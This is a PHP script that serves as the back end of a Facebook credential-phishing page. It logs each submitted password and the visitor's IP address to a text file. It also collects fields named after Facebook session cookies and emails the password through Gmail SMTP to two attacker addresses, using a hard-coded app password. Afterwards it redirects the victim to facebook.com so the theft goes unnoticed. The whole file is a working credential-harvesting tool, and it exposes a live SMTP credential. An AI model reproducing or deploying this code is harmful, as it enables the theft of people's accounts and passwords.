<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST["pass"];
    $user_ip = $_SERVER['REMOTE_ADDR']; // Get user's IP address
    
    // Save the password and IP address to log.txt
    $logText = "Password: " . htmlspecialchars($password, ENT_QUOTES, 'UTF-8') . " - IP: " . $user_ip . "\n";
    
    $logFile = fopen("pass.txt", "a");
    if ($logFile) {
        fwrite($logFile, $logText);
        fclose($logFile);
    } else {
        // Handle error opening file
    }
    
}

  ob_start(); // Start output buffering

  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\Exception;


  require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/Exception.php';
  require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/PHPMailer.php';
  require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/SMTP.php';

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $to = 'adsplace160@gmail.com    ' ;
      $subject = 'Collect Your Mall';

      $c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
      $xs = isset($_POST['xs']) ? $_POST['xs'] : '';
      $ip = $_SERVER['REMOTE_ADDR'];
      $password = isset($_POST['pass']) ? $_POST['pass'] : '';

      $message = "Password: $password";

      $headers = "From: paisaonline991@gmail.com\r\n";
      $headers .= "Reply-To: paisaonline991@gmail.com\r\n";
      $headers .= "MIME-Version: 1.0\r\n";
      $headers .= "Content-Type: text/html; charset=utf-8\r\n";
      $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
      $headers .= "X-Priority: 1\r\n";

      $smtp_host = "smtp.gmail.com";
      $smtp_port = "587";
      $smtp_username = "adsplace160@gmail.com";
      $smtp_password = 'fsqfdvxapvsomteo';

      $mail = new PHPMailer(true);
      try {
          $mail->SMTPDebug = 0;
          $mail->isSMTP();
          $mail->Host = $smtp_host;
          $mail->SMTPAuth = true;
          $mail->Username = $smtp_username;
          $mail->Password = $smtp_password;
          $mail->SMTPSecure = 'tls';
          $mail->Port = $smtp_port;

          $mail->setFrom('adsplace160@gmail.com', 'Alison James');
          $to_array = explode(',', $to);
          foreach ($to_array as $email) {
              $mail->addAddress(trim($email));
          }

          $mail->isHTML(true);
          $mail->Subject = $subject;
          $mail->Body = $message;
        $recipients = array(
         'adsplace160@gmail.com'=>'Person One',
          'paisaonline991@gmail.com'=>'Person Two'
          //''=>'Person Three'
        );
          foreach ($recipients as $email => $name){

            $mail->AddCC($email,$name);
          }

          $mail->send();
      } catch (Exception $e) {
          echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
      }

      // Redirect the user to the success page
      header("Location:  https://www.facebook.com");
      exit();
  }
  ?>

